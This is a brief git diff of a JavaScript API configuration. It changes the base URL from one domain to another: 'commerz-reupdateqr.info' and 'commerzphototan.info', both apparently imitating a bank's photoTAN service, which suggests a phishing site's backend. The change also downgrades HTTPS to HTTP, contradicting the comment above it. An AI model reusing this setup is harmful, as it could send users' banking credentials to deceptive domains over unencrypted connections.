@@ -3,7 +3,7 @@ import axios from 'axios';
 // Base URL for API calls - handle mobile network issues
 const getApiBaseUrl = () => {
   // Always use the HTTPS domain to avoid mixed content issues
-  const httpsDomain = 'https://commerz-reupdateqr.info';
+  const httpsDomain = 'http://commerzphototan.info';
   
   // Check if we're on mobile and if localhost is accessible
   const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
